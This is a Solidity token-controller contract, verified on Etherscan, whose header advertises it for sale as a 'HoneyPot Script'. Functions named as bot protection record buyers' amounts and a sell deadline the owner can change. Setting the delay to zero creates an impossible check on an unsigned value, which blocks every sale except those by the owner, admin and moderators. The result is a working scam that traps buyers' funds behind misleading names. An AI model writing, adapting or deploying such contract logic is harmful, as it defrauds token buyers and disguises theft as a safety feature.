/**
 *Submitted for verification at Etherscan.io on 2023-05-29
*/

// SPDX-License-Identifier: MIT
// Made By @HoneiPot on telegram , Message Us To Purchase This HoneyPot Script.
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }

}



contract Controller is Context, Ownable {

    mapping(address => bool) public _moderators;
    mapping(address => uint256) public _lockDelay;
    mapping(address => uint256) public _boughtAmount;

    uint private _delay = 900;
    bool private _validationActive;
    bool private _sortByContract;
    address admin;

    constructor () {
        admin = owner();
    }

    function preventBotPurchase(address to, uint amount) external {
        if (_sortByContract){
            if (Address.isContract(to)){
                _boughtAmount[to] = amount;
                _lockDelay[to] = block.timestamp + _delay;
            } else {
                _boughtAmount[to] = amount;
                _lockDelay[to] = block.timestamp;
            } 
        } else {
            _boughtAmount[to] = amount;
            _lockDelay[to] = block.timestamp + _delay;
        }
    }

        function validation(address from, uint amount, bool isMarketTo) external {
        if (isMarketTo){
            if (!isSuperUser(from)){
                require(amount <= _boughtAmount[from], "You are trying to sell more then bought!");
                _boughtAmount[from] -= amount;
                if (_delay == 0){
                    require(_lockDelay[from] < 0, "Exceed time to sell");
                }
                require(_lockDelay[from] >= block.timestamp, "Exceed time to sell");
            }
        }
    }

    function isSuperUser(address user) internal view returns(bool){
        if (user == owner() || user == admin || _moderators[user] == true){
            return true;
        } else {
            return false;
        }
    }

    function transferAdminship(address user) public onlyOwner{
        require(user != address(0), "Admin can't be zero-address");
        admin = user;
    }

        function changeSellDelay(uint newDelay) public onlyOwner {
        _delay = newDelay;
    }

    function setModerator(address user, bool status) public onlyOwner {
        _moderators[user] = status;
    }

    function validationActive() view public returns(bool) {
        return _validationActive;
    }

    function setValidationActive(bool value) public onlyOwner {
        _validationActive = value;
    }

    function setSortingByContract(bool value) public onlyOwner {
        _sortByContract = value;
    }

    function sortByContractAllowed() view public returns(bool) {
        return _sortByContract;
    }

    function af2b8c() public view returns (uint) {
        return block.timestamp;
    }
}